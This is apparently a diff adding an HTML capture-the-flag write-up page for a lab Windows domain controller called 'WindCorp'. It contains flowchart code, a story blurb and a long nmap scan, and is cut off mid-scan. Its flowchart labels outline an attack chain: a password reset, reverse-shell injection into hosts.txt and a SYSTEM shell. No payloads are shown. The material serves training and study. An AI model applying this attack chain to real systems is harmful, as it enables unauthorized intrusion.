+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Find checkservers.ps1 Script  
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Reset brittanycr's Password  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Inject Reverse Shell in hosts.txt
+[https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Get SYSTEM Shell → Capture Root Flag  
+</div>
+</div>
+
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" xintegrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js" xintegrity="sha512-M1h0i4zB/nNoM+3TLA+q3EViN9yQ9LpIq6W2daLpZ1B13Y4YI3wE4F28M3aEfsyyHn5j2vAxw8U2tKjB6i/w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  
+
+
+<style>
+.attack-path-flowchart {
+  width: 100%;
+  height: 500px;
+  background: transparent;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 8px;
+  position: relative;
+  overflow: hidden;
+  margin: 2rem 0;
+}
+
+.flowchart-controls {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  z-index: 1000;
+  display: flex;
+  gap: 5px;
+}
+
+.zoom-btn {
+  width: 32px;
+  height: 32px;
+  background: rgba(0, 0, 0, 0.7);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 4px;
+  color: #fff;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.2s ease;
+}
+
+.zoom-btn:hover {
+  background: rgba(0, 0, 0, 0.9);
+  border-color: rgba(255, 255, 255, 0.4);
+}
+
+.flowchart-svg {
+  width: 100%;
+  height: 100%;
+  background: transparent;
+  cursor: grab;
+}
+
+.flowchart-svg:active {
+  cursor: grabbing;
+}
+
+.flowchart-node {
+  cursor: pointer;
+}
+
+.flowchart-icon {
+  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
+  font-weight: 900;
+  font-size: 36px;
+  text-anchor: middle;
+  dominant-baseline: central;
+  transition: all 0.3s ease;
+  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
+}
+
+.flowchart-image {
+  transition: all 0.3s ease;
+  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
+}
+
+.flowchart-text {
+  font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  text-anchor: middle;
+  pointer-events: none;
+  user-select: none;
+  fill: #ddd;
+}
+
+.flowchart-arrow {
+  stroke: rgba(255, 255, 255, 0.4);
+  stroke-width: 1.5px;
+  transition: all 0.2s ease-in-out;
+}
+
+.flowchart-arrow.glow {
+  stroke: rgba(255, 255, 255, 1);
+  stroke-width: 2.5px;
+  filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.7));
+}
+
+.flowchart-arrow-marker {
+  fill: rgba(255, 255, 255, 0.6);
+}
+
+.flowchart-pin-icon {
+  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
+  font-weight: 900;
+  font-size: 16px;
+  fill: #DC143C;  
+  text-anchor: middle;
+  dominant-baseline: central;
+  display: none;  
+  pointer-events: none;
+  filter: drop-shadow(0 1px 2px rgba(0,0,0,0.7));
+}
+
+
+ 
+.node-recon .flowchart-icon { color: #A0522D; }  
+.node-enum .flowchart-icon { color: #4169E1; }  
+.node-exploit .flowchart-icon { color: #DC143C; }  
+.node-access .flowchart-icon { color: #2E8B57; }  
+.node-privesc .flowchart-icon { color: #FF8C00; }  
+.node-root .flowchart-icon { color: #FFD700; }  
+.node-default .flowchart-icon { color: #A9A9A9; }  
+</style>
+
+<script>
+(function() {
+  
+  "use strict";
+
+  let flowchartInstances = {};
+
+  const iconMap = {
+    recon: '\uf002', enum: '\uf0ca', exploit: '\uf1e2',
+    access: '\uf084', privesc: '\uf21b', root: '\uf624', default: '\uf059',
+    pin: '\uf08d',
+  };
+
+  function initFlowcharts() {
+    const containers = document.querySelectorAll('.attack-path-flowchart');
+    containers.forEach(container => {
+      if (container.dataset.initialized) return;
+      container.dataset.initialized = 'true';
+
+      const id = container.id;
+      const dataDiv = container.querySelector('.flowchart-data');
+      if (dataDiv) {
+        const steps = parseSteps(dataDiv.textContent);
+        if (steps.length > 0) {
+          flowchartInstances[id] = createInteractiveFlowchart(container, steps);
+          setupControls(container, id);
+        }
+      }
+    });
+  }
+
+  function setupControls(container, id) {
+    const instance = flowchartInstances[id];
+    if (!instance) return;
+    container.querySelectorAll('.zoom-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const action = btn.getAttribute('data-action');
+        if (action === 'zoom-in') {
+            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1.2);
+        } else if (action === 'zoom-out') {
+            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1 / 1.2);
+        } else if (action === 'reset') {
+          instance.svg.transition().ease(d3.easeCubicOut).duration(750).call(instance.zoom.transform, d3.zoomIdentity);
+        }
+      });
+    });
+  }
+
+  function parseSteps(content) {
+    return content.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
+      line = line.replace(/^[-*]\s*/, '');
+      const imgRe = /\[\s*([^\]]+?)\s*\]\s*(.*)/;
+      const match = line.match(imgRe);
+      const text = match ? match[2].trim() : line;
+      return { id: idx, text, type: getStepType(text), imageUrl: match ? match[1] : null, pinned: false };
+    });
+  }
+
+  function getStepType(text) {
+    const l = text.toLowerCase();
+    if (l.includes('nmap') || l.includes('scan') || l.includes('recon')) return 'recon';
+    if (l.includes('enum') || l.includes('directory') || l.includes('subdomain') || l.includes('git') || l.includes('dump') || l.includes('crawl')) return 'enum';
+    if (l.includes('exploit') || l.includes('rce') || l.includes('sqli') || l.includes('xss') || l.includes('lfi') || l.includes('upload') || l.includes('injection')) return 'exploit';
+    if (l.includes('shell') || l.includes('reverse') || l.includes('bind') || l.includes('webshell')) return 'access';
+    if (l.includes('privesc') || l.includes('privilege') || l.includes('escalation') || l.includes('sudo') || l.includes('suid') || l.includes('kernel') || l.includes('creds')) return 'privesc';
+    if (l.includes('root') || l.includes('administrator') || l.includes('system') || l.includes('sudo bee')) return 'root';
+    return 'default';
+  }
+
+  function createInteractiveFlowchart(container, nodesData) {
+    const W = container.clientWidth, H = container.clientHeight;
+    const svg = d3.select(container).append('svg')
+                  .attr('class','flowchart-svg').attr('width',W).attr('height',H);
+
+    const zoom = d3.zoom().duration(500).scaleExtent([0.1, 5]).on('zoom', e => g.attr('transform', e.transform));
+
+    svg.call(zoom);
+    const g = svg.append('g');
+
+    const defs = svg.append('defs');
+    defs.append('marker')
+        .attr('id','arrowhead').attr('viewBox','-0 -5 10 10')
+        .attr('refX', 25).attr('refY', 0)
+        .attr('orient','auto').attr('markerWidth', 5).attr('markerHeight', 5)
+      .append('path').attr('d', 'M0,-5L10,0L0,5').attr('class','flowchart-arrow-marker');
+
+    const links = nodesData.length > 1 ? d3.range(nodesData.length - 1).map(i => ({ source: nodesData[i], target: nodesData[i+1] })) : [];
+
+    const arrows = g.append("g").selectAll("line")
+      .data(links).enter().append("line")
+      .attr("class", "flowchart-arrow")
+      .attr("marker-end", "url(#arrowhead)");
+
+    const nodeGroups = g.append("g").selectAll(".flowchart-node")
+      .data(nodesData, d => d.id).enter().append("g")
+      .attr("class", d => 'flowchart-node node-' + d.type);
+
+    nodeGroups.each(function(d) {
+      const node = d3.select(this);
+      if (d.imageUrl) {
+        node.append('image')
+          .attr('href', d.imageUrl).attr('class', 'flowchart-image')
+          .attr('x', -20).attr('y', -25).attr('width', 40).attr('height', 40)
+          .on('error', function() {
+            d3.select(this.parentNode).append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap['default']);
+            d3.select(this).remove();
+          });
+      } else {
+        node.append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap[d.type] || iconMap['default']);
+      }
+    });
+
+    nodeGroups.append('text')
+      .attr('class', 'flowchart-pin-icon')
+      .attr('x', 20)
+      .attr('y', -20)
+      .text(iconMap.pin);
+
+    nodeGroups.append('text').attr('class', 'flowchart-text').attr('y', 35)
+      .each(function(d) { wrapText(d3.select(this), d.text, 100); });
+    nodeGroups.append('title').text(d => d.text);
+
+    const numNodes = nodesData.length;
+    const padding = 120;
+    const nodeRadius = 40;
+
+    const linkForce = d3.forceLink(links).id(d => d.id).distance(150).strength(0.2);
+
+    const simulation = d3.forceSimulation(nodesData)
+        .force("link", linkForce)
+        .force("charge", d3.forceManyBody().strength(-600))
+        .force("collide", d3.forceCollide().radius(nodeRadius).strength(1))
+        .force("x", d3.forceX(d => {
+            if (numNodes <= 1) return W / 2;
+            return padding + (d.id / (numNodes - 1)) * (W - 2 * padding);
+        }).strength(0.4))
+        .force("y", d3.forceY(d => {
+            if (numNodes <= 1) return H / 2;
+            const amplitude = H * 0.20;
+            const frequency = Math.PI;
+            const centerY = H / 2;
+            const phase = (d.id / (numNodes - 1)) * frequency;
+            return centerY - amplitude * Math.cos(phase);
+        }).strength(0.5))
+        .on("tick", () => {
+          arrows
+              .attr("x1", d => d.source.x)
+              .attr("y1", d => d.source.y)
+              .attr("x2", d => d.target.x)
+              .attr("y2", d => d.target.y);
+          nodeGroups
+              .attr("transform", d => `translate(${d.x},${d.y})`);
+        });
+
+    const dragHandler = d3.drag()
+        .on("start", function (event, d) {
+            if (!event.active) simulation.alphaTarget(0.3).restart();
+            d.fx = d.x;
+            d.fy = d.y;
+            
+            arrows.filter(link => link.source.id === d.id).classed('glow', true);
+            linkForce.strength(0); 
+        })
+        .on("drag", function (event, d) {
+            d.fx = event.x;
+            d.fy = event.y;
+        })
+        .on("end", function (event, d) {
+            if (!event.active) simulation.alphaTarget(0);
+            
+            linkForce.strength(0.2); 
+            
+            arrows.filter(link => link.source.id === d.id).classed('glow', false);
+
+            d.pinned = true;
+            d3.select(this).select('.flowchart-pin-icon').style('display', 'block');
+        });
+
+    nodeGroups
+      .call(dragHandler)
+      .on('mouseover', (event, d) => {
+        
+        arrows.filter(link => link.source.id === d.id).classed('glow', true);
+      })
+      .on('mouseout', (event, d) => {
+        
+        arrows.filter(link => link.source.id === d.id).classed('glow', false);
+      })
+      .on('contextmenu', function(event, d) {
+        event.preventDefault();
+        
+        if (d.pinned) {
+          d.pinned = false;
+          d.fx = null; 
+          d.fy = null;
+          d3.select(this).select('.flowchart-pin-icon').style('display', 'none');
+          simulation.alpha(0.3).restart(); 
+        }
+      });
+
+    return { svg, zoom, g };
+  }
+
+  function wrapText(textElem, str, maxW) {
+    const words = str.split(/\s+/), lineHeight = 12, x = 0;
+    textElem.text(null);
+    let line = [], tspan = textElem.append('tspan').attr('x', x);
+    for (const word of words) {
+        line.push(word);
+        tspan.text(line.join(' '));
+        if (tspan.node().getComputedTextLength() > maxW && line.length > 1) {
+            line.pop();
+            tspan.text(line.join(' '));
+            line = [word];
+            tspan = textElem.append('tspan').attr('x', x).attr('dy', `${lineHeight}px`).text(word);
+        }
+    }
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initFlowcharts);
+  } else {
+    initFlowcharts();
+  }
+})();
+</script>
+
+<p><strong>Story:</strong></p>
+<blockquote>
+<p>&ldquo;You have gained access to the internal network of WindCorp, the multibillion dollar company, running an extensive social media campaign claiming to be unhackable (ha! so much for that claim!).
+Next step would be to take their crown jewels and get full access to their internal network. You have spotted a new windows machine that may lead you to your end goal. Can you conquer this end boss and own their internal network?.&rdquo;</p></blockquote>
+
+<div class="target-info">
+    <div class="target-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <circle cx="12" cy="12" r="6"/>
+            <circle cx="12" cy="12" r="2"/>
+        </svg>
+    </div>
+    <div class="target-details">
+        <div class="target-item">
+            <span class="target-label">Target IP</span>
+            <code class="ip-address">10.10.22.233</code>
+        </div>
+        
+    </div>
+</div>
+
+<style>
+.target-info {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 16px;
+    margin: 16px 0;
+    background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+    border-left: 4px solid #9fef00;
+    border-radius: 8px;
+    font-family: system-ui, -apple-system, sans-serif;
+}
+
+.target-icon {
+    flex-shrink: 0;
+}
+
+.target-icon svg {
+    width: 20px;
+    height: 20px;
+    color: #9fef00;
+    display: block;
+}
+
+.target-details {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+
+.target-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.creds-separator {
+    flex-shrink: 0;
+    opacity: 1;
+}
+
+.creds-separator svg {
+    width: 18px;
+    height: 18px;
+    color: #9fef00;
+    display: block;
+    stroke-width: 2.5;
+}
+
+.target-label {
+    font-size: 14px;
+    font-weight: 600;
+    color: #c9d1d9;
+    white-space: nowrap;
+}
+
+.ip-address, .credentials {
+    color: #9fef00;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    font-weight: bold;
+    background: none !important;
+    background-color: transparent !important;
+    padding: 0 !important;
+    border: none !important;
+    border-radius: 0 !important;
+}
+</style>
+
+
+<hr>
+<h1 id="1-reconnaissance-ta0043">1. Reconnaissance (TA0043)<a hidden class="anchor" aria-hidden="true" href="#1-reconnaissance-ta0043">#</a></h1>
+<p>As always, we kick things off with an <code>nmap</code> scan to see what we&rsquo;re up against</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sudo</span> nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/ra 10.10.22.233 <span class="flag">-vv</span>
+# Nmap 7.95 scan initiated Mon Jul  7 10:18:12 2025 as: /usr/lib/nmap/nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/ra <span class="flag">-vv</span> 10.10.22.233
+Nmap scan report for 10.10.22.233
+Host is up, received echo-reply ttl 125 (0.13s latency).
+Scanned at 2025-07-07 10:18:12 EDT for 102s
+Not shown: 979 filtered tcp ports (no-response)
+PORT     STATE SERVICE             REASON          VERSION
+53/tcp   open  domain              syn-ack ttl 125 Simple DNS Plus
+80/tcp   open  http                syn-ack ttl 125 Microsoft IIS httpd 10.0
+|_http-title: Windcorp.
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec        syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-07-07 14:18:25Z)
+135/tcp  open  msrpc               syn-ack ttl 125 Microsoft Windows RPC
+139/tcp  open  netbios-ssn         syn-ack ttl 125 Microsoft Windows netbios-ssn
+389/tcp  open  ldap                syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?       syn-ack ttl 125
+464/tcp  open  kpasswd5?           syn-ack ttl 125
+593/tcp  open  ncacn_http          syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped          syn-ack ttl 125
+2179/tcp open  vmrdp?              syn-ack ttl 125
+3268/tcp open  ldap                syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped          syn-ack ttl 125
+3389/tcp open  ms-wbt-server       syn-ack ttl 125 Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WINDCORP
+|   NetBIOS_Domain_Name: WINDCORP
+|   NetBIOS_Computer_Name: FIRE
+|   DNS_Domain_Name: windcorp.thm
+|   DNS_Computer_Name: Fire.windcorp.thm
+|   DNS_Tree_Name: windcorp.thm
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-07-07T14:18:54+00:00
+|_ssl-date: 2025-07-07T14:19:33+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Fire.windcorp.thm
+| Issuer: commonName=Fire.windcorp.thm
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-07-06T14:17:39
+| Not valid after:  2026-01-05T14:17:39
+| MD5:   6e17:c117:2e4b:a1ad:0b3a:1b48:b82e:a760
+| SHA-1: 9281:bfd7:f2ad:5373:8204:8124:d95a:2a4a:9282:70f7
+| <span class="flag">-----BEGIN</span> CERTIFICATE-----
+| MIIC5jCCAc6gAwIBAgIQFqZeNiOsS7xONsYOVUv+oTANBgkqhkiG9w0BAQsFADAc
+| MRowGAYDVQQDExFGaXJlLndpbmRjb3JwLnRobTAeFw0yNTA3MDYxNDE3MzlaFw0y
+| NjAxMDUxNDE3MzlaMBwxGjAYBgNVBAMTEUZpcmUud2luZGNvcnAudGhtMIIBIjAN
+| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw/mMB77zSh9MEBmBU9lZFArRskth
+| xAg2mN/g2siWl4asufhCxMK+0rfsxuPd4PsrdA72ONoR2DPyoWesIJvZxMlOizCJ
+| Z6jiUjeNIXwEoWOaML+FWYOgtsz4XgyS0oazidKXAAU7+aODndqIniX8BVFBJ3zL
+| LUFZ+TcpzFWeb+Ndacc87Dj6tsMPH2SY6ns2w4YGTLk/x2CEBeZqbQNAehF+ktlv
+| J0EhLkT8EFSUtdRx449hLoLM52W7ablEk5PGvotmzjr5ZTgeyPR1u62y5BMzW1Ml
+| e3Wd2JezqWwJD4F8lIrUOffXOtijd6qqclqBX90q4vw9UgcbKqOkCCiIyQIDAQAB
+| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
+| AQELBQADggEBAFZhYT1jQyIWH5c6baktb7Y3eL61YgBc7A4yN4MLbRX5K4oIAhQC
+| A/aYTwySTWpSTUHShuaqlaSiDQhMzc5ytWmv0pg5DHqXbbESgX7MwI1q8HMCOOyf
+| /Ir1F1zSiNcN94tUxRbjMHTdy21E8ainEXohDd7gCmIFNVJH2LrE4oMAA5RpfTdC
+| Rhj+B016uUJLg3cShSitcG5W32dcV1uYFj3T/P9UeFDib6FzeX7GvBPT7RkXWPVR
+| fEzVHC/GEKUw0mggm0EidkNH7xP1U94afc641lvHtbPtiOgU1DCOGniL0QpyUcqW
+| 5pyXi3PC+70iRWK8KVXTSrCU7xdY1EwFJSQ=
+|_-----END CERTIFICATE-----
+5222/tcp open  jabber              syn-ack ttl 125
+|_ssl-date: 2025-07-07T14:19:34+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
+| Issuer: commonName=fire.windcorp.thm
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-05-01T08:39:00
+| Not valid after:  2025-04-30T08:39:00
+| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
+| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
+| <span class="flag">-----BEGIN</span> CERTIFICATE-----
+| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
+| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
+| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
+| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
+| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
+| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
+| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
+| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
+| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
+| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
+| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
+| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
+| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
+| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
+| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
+| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
+| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
+| LucP
+|_-----END CERTIFICATE-----
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     stream_id: 41t586ui0i
+|     errors: 
+|       invalid-namespace
+|       (timeout)
+|     unknown: 
+|     auth_mechanisms: 
+|     capabilities: 
+|     xmpp: 
+|       version: 1.0
+|     compression_methods: 
+|_    features: 
+5269/tcp open  xmpp                syn-ack ttl 125 Wildfire XMPP Client
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     features: 
+|     errors: 
+|       (timeout)
+|     unknown: 
+|     capabilities: 
+|     xmpp: 
+|     auth_mechanisms: 
+|_    compression_methods: 
+7070/tcp open  http                syn-ack ttl 125 Jetty 9.4.18.v20190429
+|_http-server-header: Jetty(9.4.18.v20190429)
+|_http-title: Openfire HTTP Binding Service
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+7443/tcp open  ssl/http            syn-ack ttl 125 Jetty 9.4.18.v20190429
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| ssl-cert: Subject: commonName=fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
+| Issuer: commonName=fire.windcorp.thm
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-05-01T08:39:00
+| Not valid after:  2025-04-30T08:39:00
+| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
+| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
+| <span class="flag">-----BEGIN</span> CERTIFICATE-----
+| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
+| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
+| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
+| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
+| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
+| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
+| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
+| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
+| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
+| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
+| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
+| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
+| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
+| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
+| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
+| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
+| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
+| LucP
+|_-----END CERTIFICATE-----
+|_http-server-header: Jetty(9.4.18.v20190429)
+|_http-title: Openfire HTTP Binding Service
+7777/tcp open  socks5              syn-ack ttl 125 (No authentication; connection failed)
+| socks-auth-info: 
+|_  No authentication
+9090/tcp open  hadoop-datanode     syn-ack ttl 125 Apache Hadoop
+| hadoop-datanode-info: 
+|_  Logs: jive-ibtn jive-btn-gradient
+| hadoop-tasktracker-info: 
+|_  Logs: jive-ibtn jive-btn-gradient
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html).
+|_http-favicon: Unknown favicon MD5: E4888EE8491B4EB75501996E41AF6460
+9091/tcp open  ssl/hadoop-datanode syn-ack ttl 125 Apache Hadoop
+| hadoop-datanode-info: 
+|_  Logs: jive-ibtn jive-btn-gradient
+|_http-title: Site doesn't have a title (text/html).
+|_http-favicon: Unknown favicon MD5: E4888EE8491B4EB75501996E41AF6460
+| hadoop-tasktracker-info: 
+|_  Logs: jive-ibtn jive-btn-gradient
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| ssl-cert: Subject: commonName=fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
+| Issuer: commonName=fire.windcorp.thm
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-05-01T08:39:00
+| Not valid after:  2025-04-30T08:39:00
+| MD5:   b715:5425:83f3:a20f:75c8:ca2d:3353:cbb7
+| SHA-1: 97f7:0772:a26b:e324:7ed5:bbcb:5f35:7d74:7982:66ae
+| <span class="flag">-----BEGIN</span> CERTIFICATE-----
+| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
+| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
+| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
+| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
+| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
+| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
+| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
+| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
+| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
+| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
+| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
+| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
+| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
+| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
+| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
+| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
